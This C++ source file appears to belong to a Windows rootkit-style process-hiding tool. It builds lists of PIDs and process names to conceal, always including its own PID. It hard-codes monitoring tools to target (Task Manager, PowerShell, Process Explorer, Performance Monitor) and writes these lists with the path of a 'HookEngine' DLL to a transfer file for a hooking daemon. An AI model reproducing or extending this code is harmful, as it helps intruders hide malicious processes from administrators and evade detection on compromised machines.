#include "Preparations.h"
#include "Daemon.h"
int *hiddenPIDsList;
TCHAR **hiddenProcessNames;
int PIDsNum=0, procNameNum=0;

vector<wstring> frobiddenProcessesList;

void initFrobProcList()
{
	LPWSTR BasicfrobProcList[] = { L"Taskmgr.exe", L"powershell.exe", L"procexp.exe", L"procexp64.exe", L"perfmon.exe" };
	const int numBasicFrobProc = 5;
	for (int i = 0; i < numBasicFrobProc; i++)
	{
		frobiddenProcessesList.push_back(wstring(BasicfrobProcList[i]));
	}	
}

int addProcessesToFrobList(TCHAR *optarg)
{
	int i = 0;
	TCHAR str_buffer[MAX_COMMAND], *pwc, *context, *delim = L",/";
	if (wcslen(optarg) == 0)
		return 0;
	wcscpy_s(str_buffer, MAX_COMMAND, optarg);
	pwc = wcstok_s(str_buffer, delim, &context);
	while (pwc != NULL)
	{
		i++;
		frobiddenProcessesList.push_back(wstring(pwc));
		pwc = wcstok_s(NULL, delim, &context);
	}
	return i;
}
void getSelfFolder(TCHAR *target,int num_tchars)
{
	GetModuleFileNameEx(GetCurrentProcess(), NULL, target, num_tchars);
	getFolderFromPath(target);
}

void getFolderFromPath(TCHAR *target)
{
	TCHAR *x;
	TCHAR buffer[MAX_PATH] = L"\0";
	TCHAR *pwc1 = wcstok_s(target, L"\\/", &x), *pwc2 = L"";
	while (pwc1 != NULL)
	{

		wcscat_s(buffer, MAX_PATH, pwc2);
		if (wcslen(pwc2) != 0)
			wcscat_s(buffer, MAX_PATH, L"\\");
		pwc2 = pwc1;
		pwc1 = wcstok_s(NULL, L"\\/", &x);
	}
	target[0] = L'\0';
	wcscat_s(target, MAX_PATH, buffer);
	return;
}

int buildPIDsList(const TCHAR *optarg, BOOL includeSelf, int **intBuffer)
{
	//returned value - number of PIDs in list
	TCHAR str_buffer[MAX_COMMAND], *context, *pwc, *delim = L",./";
	int sizeOfIntBuffer = sizeof(int)*(int)(1 + ceil(wcslen(optarg) / (float)2));
	*intBuffer = (int *)malloc((sizeOfIntBuffer));  //maximum ints is ceil(strlen(str)/2) is each pid is a digit, plus one for self
	int i = 0, sizeOfStrBuffer = sizeof(TCHAR)*(MAX_COMMAND);
	wcscpy_s(str_buffer, MAX_COMMAND, optarg);
	if (wcslen(optarg) == 0 && !includeSelf)
		return 0;
	if (includeSelf)
	{
		(*intBuffer)[i] = (int)GetCurrentProcessId();
		i++;
	}
	pwc = wcstok_s(str_buffer, delim, &context);
	while (pwc != NULL)
	{
		int x_buffer = _wtoi(pwc);
		if (x_buffer != 0)
		{
			(*intBuffer)[i] = x_buffer;
			i++;
		}
		pwc = wcstok_s(NULL, delim, &context);
	}
	return i;

}

int buildProcNameList(const TCHAR *optarg, BOOL includeSelf, TCHAR ***outStrBuffer)
{
	TCHAR *str_buffer, *context, *pwc, *delim = L",";
	int i = 0, sizeOfStrBuffer = (int)sizeof(TCHAR)*(int)(wcslen(optarg) + 1);
	if (wcslen(optarg) == 0)
		return 0;
	*outStrBuffer = (TCHAR **)malloc(sizeof(TCHAR*)*wcslen(optarg));
	str_buffer = (TCHAR *)malloc(sizeOfStrBuffer);
	wcscpy_s(str_buffer, (wcslen(optarg) + 1), optarg);
	
	if (includeSelf)
	{
		TCHAR tmpSelfBuffer[MAX_PATH];
		GetModuleBaseName(GetCurrentProcess(), NULL, tmpSelfBuffer, sizeof(tmpSelfBuffer));
		int SizeOfStr = (int)sizeof(TCHAR)*(int)(1 + wcslen(tmpSelfBuffer));
		TCHAR *xx = (TCHAR *)malloc(SizeOfStr);
		(*outStrBuffer)[i] = xx;
		wcscpy_s((*outStrBuffer)[i], (1 + wcslen(tmpSelfBuffer)), tmpSelfBuffer);
		i++;
	}
	pwc = wcstok_s(str_buffer, delim, &context);
	while (pwc != NULL)
	{
		int SizeOfStr = (int)sizeof(TCHAR)*(int)(1 + wcslen(pwc));
		(*outStrBuffer)[i] = (TCHAR *)malloc(SizeOfStr);
		wcscpy_s((*outStrBuffer)[i], (1 + wcslen(pwc)), pwc);
		i++;
		pwc = wcstok_s(NULL, delim, &context);
	}
	return i;

}




BOOL BuildHiddenProcessesLists(int argc, _TCHAR* argv[])
{
	bool isParameter_i_active = false, isParameter_n_active = false;
	int opt;
	initFrobProcList();
	while ((opt = getopt(argc, argv, L"i:n:x:")) != -1) {
		switch (opt) {
		case 'i':
			if (optarg == NULL)
			{
				printf("Illegal use of option i!\n");
				return FALSE;
			}
			else
			{
				isParameter_i_active = true;
				PIDsNum = buildPIDsList(optarg, TRUE, &hiddenPIDsList);
				if (PIDsNum == 0)
				{
					printf("Error using -i option!\n");
					return FALSE;
				}
			}
			break;
		case 'n':
			if (optarg == NULL)
			{
				printf("Illegal use of option n!\n");
				return FALSE;
			}
			else
			{
				isParameter_n_active = true;
				procNameNum = buildProcNameList(optarg, FALSE, &hiddenProcessNames);
				if (procNameNum == 0)
				{
					printf("Error using -n option!\n");
					return FALSE;
				}
			}
			break;
		case 'x':
		{
					if (addProcessesToFrobList(optarg) == 0)
					{
						printf("Error using -x option!\n");
						return FALSE;
					}
		}
			break;
		default: /* '?' */
			printf("Illegal use of option!\n");
			return FALSE;
			break;
		}
	}
	if (!(isParameter_n_active || isParameter_i_active))
	{
		printf("Error! You must enter at least one parameter!\n");
		return FALSE;
	}
	if (!isParameter_i_active)
	{
		PIDsNum = buildPIDsList(L"", TRUE, &hiddenPIDsList);
	}
	return TRUE;
}


void WriteInfoToFile(int *hiddenPIDsList, int PIDsNum, TCHAR **hiddenProcessNames, int procNameNum)
{
	//format -	first line - pIDs seperated by commas
	//			second line - process names seperated by commas
	//			third line - location of the HookEngine dll
	TCHAR proc_name_buffer[MAX_PROC_NAME_LEN];
	FILE* fp; fopen_s(&fp,INFO_TRANSFER_FILE, "w");
	int i;
	if (PIDsNum > 0)
	{
		for (i = 0; i < PIDsNum - 1; i++)
		{
			fprintf(fp, "%d,", hiddenPIDsList[i]);
		}
		fprintf(fp, "%d", hiddenPIDsList[i]);
	}
	fprintf(fp, "\n");
	if (procNameNum>0)
	{

		for (i = 0; i < procNameNum - 1; i++)
		{
			wcscpy_s(proc_name_buffer, MAX_PROC_NAME_LEN, hiddenProcessNames[i]);
			fprintf(fp, "%ws,", proc_name_buffer);
		}
		wcscpy_s(proc_name_buffer, MAX_PROC_NAME_LEN, hiddenProcessNames[i]);
		fprintf(fp, "%ws", proc_name_buffer);
	}
	fprintf(fp, "\n");
	TCHAR dllLocBuffer[MAX_PATH];
	GetModuleFileNameEx(GetCurrentProcess(), NULL, dllLocBuffer, MAX_PATH);
	getFolderFromPath(dllLocBuffer);
	wcscat_s(dllLocBuffer, MAX_PATH, HookEngine);
	fprintf(fp, "%ws\n", dllLocBuffer);
	fclose(fp);
}


BOOL PrepareContents(int argc, TCHAR * argv[])
{
	if (!BuildHiddenProcessesLists(argc, argv))
		return FALSE;
	WriteInfoToFile(hiddenPIDsList, PIDsNum, hiddenProcessNames, procNameNum);
	return TRUE;
}